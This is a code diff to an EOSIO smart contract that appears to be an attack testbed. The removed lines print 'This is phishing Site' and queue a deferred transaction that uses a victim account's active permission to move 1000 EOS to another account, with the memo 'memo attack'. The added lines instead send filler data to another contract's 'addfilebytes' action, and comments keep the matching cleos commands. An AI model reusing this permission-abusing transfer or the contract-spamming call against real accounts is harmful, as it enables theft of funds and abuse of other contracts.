@@ -41,20 +41,22 @@ class [[eosio::contract]] CallContract: public contract{
 		[[eosio::action]]
         void main(name client1, name client2, uint64_t idx, asset t)
         {
-            print("[!!!!!!!!!!!!] This is phishing Site!!!\n");
+            print("START!\n");
             transaction out1{};
             //name targetContract = "phising"_n;
             //name method         = "main"_n;
 		
-            name targetContract = name("eosio.token");
-            name method         = name("transfer");
+            //name targetContract = name("eosio.token");
+            name targetContract = name("danakilblock");
+            //name method         = name("transfer");
+            name method         = name("addfilebytes");
             
             //cleos push action client1  addfilebytes '[2,"aa22222222a",5]' -p client   // danakilblock contract 
-			//out1.actions.emplace_back(permission_level{_self, "active"_n}, targetContract , method , std::make_tuple(idx,"AAAAAAAAAAAAAAAAAAAAAAAAAA",22));
+			out1.actions.emplace_back(permission_level{_self, "active"_n}, targetContract , method , std::make_tuple(idx,"AAAAAAAAAAAAAAAAAAAAAAAAAA",22));
 			//out1.actions.emplace_back(permission_level{_self, "active"_n}, targetContract , method , std::make_tuple(name("client2"),idxa,t));
             //cleos push action eosio.token transfer '["client1","client2","1.0000 EOS","memo"]' -p client1
 			
-			out1.actions.emplace_back(permission_level{client1, "active"_n}, targetContract , method, std::make_tuple(client1, client2 ,extended_asset(1000, extended_symbol(symbol(symbol_code("EOS"),4), name("eosio.token"))) , std::string("memo attack")));
+			//out1.actions.emplace_back(permission_level{client1, "active"_n}, targetContract , method, std::make_tuple(client1, client2 ,extended_asset(1000, extended_symbol(symbol(symbol_code("EOS"),4), name("eosio.token"))) , std::string("memo attack")));
 			//transaction transfer;
 			//transfer.actions.emplace_back(eosio::permission_level {_self, N(active) }, N(eosio.token), N(transfer), std::make_tuple(from_account, to_account_1, quantity_to_send, std::string("memo")));
             out1.send( idx+1, client1);
